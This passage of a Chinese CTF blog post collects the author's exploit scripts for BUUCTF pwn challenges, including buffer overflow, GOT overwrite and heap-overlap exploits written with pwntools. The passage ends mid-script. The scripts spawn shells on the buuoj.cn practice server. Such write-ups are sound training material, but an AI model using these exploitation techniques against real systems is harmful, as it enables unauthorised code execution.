class="toc-number">59.1.</span> <span class="toc-text">经过黑盒测试，发现strcpy的漏洞，然后多次黑盒测试发现leak了libc和stack_addr，然后通过strcpy实现栈溢出，然后在main函数执行完毕时，进行栈迁移，迁移到rop处，从而执行system(“&#x2F;bin&#x2F;sh\x00”)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x58-nsctf-online-2019-pwn1"><span class="toc-number">60.</span> <span class="toc-text">0x58 nsctf_online_2019_pwn1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#覆盖-malloc-hook为one-gadget"><span class="toc-number">60.1.</span> <span class="toc-text">覆盖__malloc_hook为one_gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x59-nsctf-online-2019-pwn2"><span class="toc-number">61.</span> <span class="toc-text">0x59 nsctf_online_2019_pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-ciscn-2019-sw-5"><span class="toc-number">62.</span> <span class="toc-text">0x60 ciscn_2019_sw_5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu-18-04"><span class="toc-number">62.1.</span> <span class="toc-text">Ubuntu 18.04</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x61-ciscn-nw-2"><span class="toc-number">63.</span> <span class="toc-text">0x61 ciscn_nw_2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu-18-04-1"><span class="toc-number">63.1.</span> <span class="toc-text">Ubuntu 18.04</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x62-ciscn-2019-en-1"><span class="toc-number">64.</span> <span class="toc-text">0x62 ciscn_2019_en_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#标准的arm-pwn-rop，很适合新手"><span class="toc-number">64.1.</span> <span class="toc-text">标准的arm pwn rop，很适合新手</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x63-ciscn-2019-n-2"><span class="toc-number">65.</span> <span class="toc-text">0x63 ciscn_2019_n_2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu-18-04-2"><span class="toc-number">65.1.</span> <span class="toc-text">Ubuntu 18.04</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x64-TWCTF-online-2019-asterisk-alloc"><span class="toc-number">66.</span> <span class="toc-text">0x64 TWCTF_online_2019_asterisk_alloc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x65-other-babystack"><span class="toc-number">67.</span> <span class="toc-text">0x65 other_babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x66-ciscn-2019-es-5"><span class="toc-number">68.</span> <span class="toc-text">0x66 ciscn_2019_es_5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0堆块和realloc函数之间的冲突导致double-free"><span class="toc-number">68.1.</span> <span class="toc-text">0堆块和realloc函数之间的冲突导致double free</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x67-roarctf-2019-realloc-magic"><span class="toc-number">69.</span> <span class="toc-text">0x67 roarctf_2019_realloc_magic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc-leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache-attack控制free-hook-8的地址数据为-bin-sh-x00，然后向下覆盖free-hook地址为system，然后直接free就可以拿到shell。"><span class="toc-number">69.1.</span> <span class="toc-text">realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache attack控制free_hook - 8的地址数据为&#x2F;bin&#x2F;sh\x00，然后向下覆盖free_hook地址为system，然后直接free就可以拿到shell。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。"><span class="toc-number">69.2.</span> <span class="toc-text">非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu18"><span class="toc-number">69.3.</span> <span class="toc-text">Ubuntu18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常规解"><span class="toc-number">69.4.</span> <span class="toc-text">常规解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ubuntu18-1"><span class="toc-number">69.5.</span> <span class="toc-text">Ubuntu18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非常规解"><span class="toc-number">69.6.</span> <span class="toc-text">非常规解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x68-roarctf-2019-easy-pwn"><span class="toc-number">70.</span> <span class="toc-text">0x68 roarctf_2019_easy_pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#堆块重叠即可"><span class="toc-number">70.1.</span> <span class="toc-text">堆块重叠即可</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x69-极客大挑战-2019-Not-Bad"><span class="toc-number">71.</span> <span class="toc-text">0x69 [极客大挑战 2019]Not Bad</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x70-axb-2019-fmt32"><span class="toc-number">72.</span> <span class="toc-text">0x70 axb_2019_fmt32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x71-axb-2019-heap"><span class="toc-number">73.</span> <span class="toc-text">0x71 axb_2019_heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x72-axb-2019-fmt64"><span class="toc-number">74.</span> <span class="toc-text">0x72 axb_2019_fmt64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x73-bytectf-2019-vip"><span class="toc-number">75.</span> <span class="toc-text">0x73 bytectf_2019_vip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x74-SWPUCTF-2019-login"><span class="toc-number">76.</span> <span class="toc-text">0x74 SWPUCTF_2019_login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x75-SWPUCTF-2019-p1KkHeap"><span class="toc-number">77.</span> <span class="toc-text">0x75 SWPUCTF_2019_p1KkHeap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x76-axb-2019-final-blindHeap"><span class="toc-number">78.</span> <span class="toc-text">0x76 axb_2019_final_blindHeap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x77-axb-2019-brop64"><span class="toc-number">79.</span> <span class="toc-text">0x77 axb_2019_brop64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x78-jarvisoj-tell-me-something"><span class="toc-number">80.</span> <span class="toc-text">0x78 jarvisoj_tell_me_something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x79-jarvisoj-level3-x64"><span class="toc-number">81.</span> <span class="toc-text">0x79 jarvisoj_level3_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x80-jarvisoj-level0"><span class="toc-number">82.</span> <span class="toc-text">0x80 jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x81-jarvisoj-level1"><span class="toc-number">83.</span> <span class="toc-text">0x81 jarvisoj_level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x82-jarvisoj-level2"><span class="toc-number">84.</span> <span class="toc-text">0x82 jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x83-jarvisoj-level2-x64"><span class="toc-number">85.</span> <span class="toc-text">0x83 jarvisoj_level2(x64)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x84-jarvisoj-leve3"><span class="toc-number">86.</span> <span class="toc-text">0x84 jarvisoj_leve3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x85-jarvisoj-level4"><span class="toc-number">87.</span> <span class="toc-text">0x85 jarvisoj_level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x86-jarvisoj-level5"><span class="toc-number">88.</span> <span class="toc-text">0x86 jarvisoj_level5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x87-jarvisoj-level6"><span class="toc-number">89.</span> <span class="toc-text">0x87 jarvisoj_level6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x88-jarvisoj-level6-x64"><span class="toc-number">90.</span> <span class="toc-text">0x88 jarvisoj_level6(x64)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x89-jarvisoj-test-your-memory"><span class="toc-number">91.</span> <span class="toc-text">0x89 jarvisoj_test_your_memory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x90-jarvisoj-itemboard"><span class="toc-number">92.</span> <span class="toc-text">0x90 jarvisoj_itemboard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x91-jarvisoj-fm"><span class="toc-number">93.</span> <span class="toc-text">0x91 jarvisoj_fm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x92-pwnable-orw"><span class="toc-number">94.</span> <span class="toc-text">0x92 pwnable_orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x93-jarvisoj-typo"><span class="toc-number">95.</span> <span class="toc-text">0x93 jarvisoj_typo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x94-others-shellcode"><span class="toc-number">96.</span> <span class="toc-text">0x94 others_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x95-huxiangbei-2019-hacknote"><span class="toc-number">97.</span> <span class="toc-text">0x95 huxiangbei_2019_hacknote</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x96-shanghai2019-boringheap"><span class="toc-number">98.</span> <span class="toc-text">0x96 shanghai2019_boringheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18"><span class="toc-number">98.1.</span> <span class="toc-text">该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x97-shanghai2019-login"><span class="toc-number">99.</span> <span class="toc-text">0x97 shanghai2019_login</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18-1"><span class="toc-number">99.1.</span> <span class="toc-text">该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆破libc"><span class="toc-number">99.2.</span> <span class="toc-text">爆破libc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x98-xdctf2015-pwn200"><span class="toc-number">100.</span> <span class="toc-text">0x98 xdctf2015_pwn200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x99-bctf2016-bcloud"><span class="toc-number">101.</span> <span class="toc-text">0x99 bctf2016_bcloud</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x100-cmcc-pwn2"><span class="toc-number">102.</span> <span class="toc-text">0x100 cmcc_pwn2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#感想："><span class="toc-number"></span> <span class="toc-text">感想：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2019年底了，我还是单身-ﾟДﾟ≡ﾟдﾟ-，一天天看着0202年的到来～～（划重点）"><span class="toc-number">0.1.</span> <span class="toc-text">2019年底了，我还是单身(ﾟДﾟ≡ﾟдﾟ)!?，一天天看着0202年的到来～～（划重点）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#啦啦啦-完结撒花-今年的任务算是完成了～-￣▽￣～"><span class="toc-number">0.2.</span> <span class="toc-text">啦啦啦 完结撒花 今年的任务算是完成了～(￣▽￣～)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识-｀・ω・´"><span class="toc-number">0.3.</span> <span class="toc-text">这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识(｀・ω・´)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#祝BUUOJ越来越好！（￣▽￣）-赵总越来越rich"><span class="toc-number">0.4.</span> <span class="toc-text">祝BUUOJ越来越好！（￣▽￣） 赵总越来越rich</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#南梦小剧场："><span class="toc-number"></span> <span class="toc-text">南梦小剧场：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←-←"><span class="toc-number">0.1.</span> <span class="toc-text">神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←_←</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？-´；ω；-100个EXP，瞧瞧这是人说的话吗？）"><span class="toc-number">0.2.</span> <span class="toc-text">南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？ (´；ω；&#96;) 100个EXP，瞧瞧这是人说的话吗？）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？"><span class="toc-number">0.3.</span> <span class="toc-text">神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）"><span class="toc-number">0.4.</span> <span class="toc-text">南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#更新与维护"><span class="toc-number"></span> <span class="toc-text">更新与维护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后续可能会进一步更新x64和x32的解法（如果存在解的话）"><span class="toc-number">0.1.</span> <span class="toc-text">后续可能会进一步更新x64和x32的解法（如果存在解的话）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP解释之后可能会进一步完善（-就看我有没有女朋友了-°∀°-ﾉ-）"><span class="toc-number">0.2.</span> <span class="toc-text">EXP解释之后可能会进一步完善（ 就看我有没有女朋友了(°∀°)ﾉ ）</span></a></li></ol></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(/2019/07/13/CTF-BUUCTF-Pwn刷题之旅-(1)/bg.png)"><div id="post-info"><div id="post-title"><div class="posttitle">CTF-BUUCTF-Pwn刷题之旅-(1)</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2019-07-13<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2020-02-16</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon fa-fw" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span><div class="post-meta-wordcount"><i class="fa fa-file-word-o post-meta__icon fa-fw" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">1.6k</span><span class="post-meta__separator">|</span><i class="fa fa-clock-o post-meta__icon fa-fw" aria-hidden="true"></i><span>阅读时长: 9 分钟</span><div class="post-meta-pv-cv"><span class="post-meta__separator">|</span><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>阅读量:</span><span id="busuanzi_value_page_pv"></span><span class="post-meta__separator">|</span><i class="fa fa-comments-o post-meta__icon fa-fw" aria-hidden="true"></i><span>评论数:</span><a href="/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/#post-comment"><span class="gitalk-comment-count comment-count"></span></a></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><html><head></head><body><h2 id="0x01-warmup-csaw-2016"><a href="#0x01-warmup-csaw-2016" class="headerlink" title="0x01 warmup_csaw_2016"></a>0x01 warmup_csaw_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("warmup_csaw_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./warmup_csaw_2016")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">	sh.recvuntil(">")</span><br><span class="line">	pop_rdi_ret = 0x0000000000400713</span><br><span class="line">	payload = "a" * 72 + p64(0x0000000000400611)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20035,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x02-RIP覆盖一下"><a href="#0x02-RIP覆盖一下" class="headerlink" title="0x02 RIP覆盖一下"></a>0x02 RIP覆盖一下</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=0</span><br><span class="line">def connect(debug):</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./pwn1")		</span><br><span class="line">	else:</span><br><span class="line">		sh = remote("buuoj.cn",6001)</span><br><span class="line">def pwn():</span><br><span class="line">	offset = 23</span><br><span class="line">	payload = offset*"a" + p64(0x000000000040118A)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	connect(0)</span><br><span class="line">	pwn()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x03-babyfengshui-33c3-2016"><a href="#0x03-babyfengshui-33c3-2016" class="headerlink" title="0x03 babyfengshui_33c3_2016"></a>0x03 babyfengshui_33c3_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("babyfengshui")</span><br><span class="line">libc = ELF("x86_libc.so.6")</span><br><span class="line">def add(name_size,name,text_size,text):</span><br><span class="line">	sh.recvuntil("Action: ")</span><br><span class="line">	sh.sendline("0")</span><br><span class="line">	sh.recvuntil("size of description: ")</span><br><span class="line">	sh.sendline(str(name_size))</span><br><span class="line">	sh.recvuntil("name: ")</span><br><span class="line">	sh.sendline(name)</span><br><span class="line">	sh.recvuntil("text length: ")</span><br><span class="line">	sh.sendline(str(text_size))</span><br><span class="line">	sh.recvuntil("text:")</span><br><span class="line">	sh.sendline(text)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil("Action: ")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("index: ")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def edit(idx,text,size):</span><br><span class="line">	sh.recvuntil("Action: ")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.recvuntil("index: ")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil("text length: ")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("text: ")</span><br><span class="line">	sh.sendline(text)</span><br><span class="line">def delete(idx):</span><br><span class="line">	sh.recvuntil("Action: ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("index: ")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def connect(debug):</span><br><span class="line">	global sh</span><br><span class="line">	if(debug != 0):</span><br><span class="line">		sh = process("./babyfengshui")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote("buuoj.cn",20002)</span><br><span class="line">def pwn():	</span><br><span class="line">	offset = 0x98b1130 - 0x98b1008</span><br><span class="line">	add(0x80,'\x11\n',0x80,'\x12\n')</span><br><span class="line">	add(0x10,'\x13\n',0x10,"\x14\n")</span><br><span class="line">	add(0x10,'\x15\x15',0x10,'\x16\x16')</span><br><span class="line">	add(0x10,'/bin/sh\x00',0x10,"/bin/sh\x00")</span><br><span class="line">	delete(0)</span><br><span class="line">	#gdb.attach(sh.pid)</span><br><span class="line">	add(0x100,'\x17\n',0x200,0x128 * 'a' + p32(elf.got['free']))</span><br><span class="line">	show(1)</span><br><span class="line">	sh.recvuntil("description: ")</span><br><span class="line">	libc_base = u32(sh.recv(4)) - libc.symbols['free']</span><br><span class="line">	system_addr = libc.symbols['system'] + libc_base</span><br><span class="line">	edit(1,p32(system_addr),0x4)</span><br><span class="line">	delete(3)</span><br><span class="line">	log.success("libc: " + hex(libc_base))</span><br><span class="line">	log.success("system_addr:" + hex(system_addr))</span><br><span class="line">	#log.success("PID: " + str(sh.pid))</span><br><span class="line">	sh.interactive()</span><br><span class="line"></span><br><span class="line">if "__main__" == __name__:</span><br><span class="line">	connect(0)</span><br><span class="line">	pwn()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x04-babyheap-0ctf-2017"><a href="#0x04-babyheap-0ctf-2017" class="headerlink" title="0x04 babyheap_0ctf_2017"></a>0x04 babyheap_0ctf_2017</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("babyheap_0ctf_2017")</span><br><span class="line">libc = ELF("x64_libc.so.6")</span><br><span class="line">#libc = ELF("libc-2.23.so")</span><br><span class="line">def add(size):</span><br><span class="line">	sh.recvuntil("Command: ")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Size: ")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">	sh.recvuntil("Command: ")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Index: ")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil("Size: ")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("Content: ")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def delete(idx):</span><br><span class="line">	sh.recvuntil("Command: ")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def dump(idx):</span><br><span class="line">	sh.recvuntil("Command: ")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("Index: ")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def connect(debug):</span><br><span class="line">	global sh</span><br><span class="line">	if(debug == 0):</span><br><span class="line">		sh = remote("buuoj.cn", 20001)</span><br><span class="line">	else:</span><br><span class="line">		sh = process("./babyheap_0ctf_2017")	</span><br><span class="line">def pwn():</span><br><span class="line">	add(0x10)</span><br><span class="line">	add(0x10)</span><br><span class="line">	add(0x10)</span><br><span class="line">	add(0x10)</span><br><span class="line">	add(0x80)</span><br><span class="line">	delete(1)</span><br><span class="line">	delete(2)</span><br><span class="line">	payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80)</span><br><span class="line">	edit(0,len(payload),payload)</span><br><span class="line">	payload = p64(0)*3 + p64(0x21)</span><br><span class="line">	edit(3,len(payload),payload)</span><br><span class="line">	add(0x10)</span><br><span class="line">	add(0x10)</span><br><span class="line">	payload = p64(0)*3 + p64(0x91)</span><br><span class="line">	edit(3,len(payload),payload)</span><br><span class="line">	add(0x80)</span><br><span class="line">	delete(4)</span><br><span class="line">	dump(2)</span><br><span class="line">	sh.recvuntil("Content: \n")</span><br><span class="line">	libc_base = u64(sh.recv(8)) - 0x3C4B78</span><br><span class="line">	malloc_hook = libc_base + 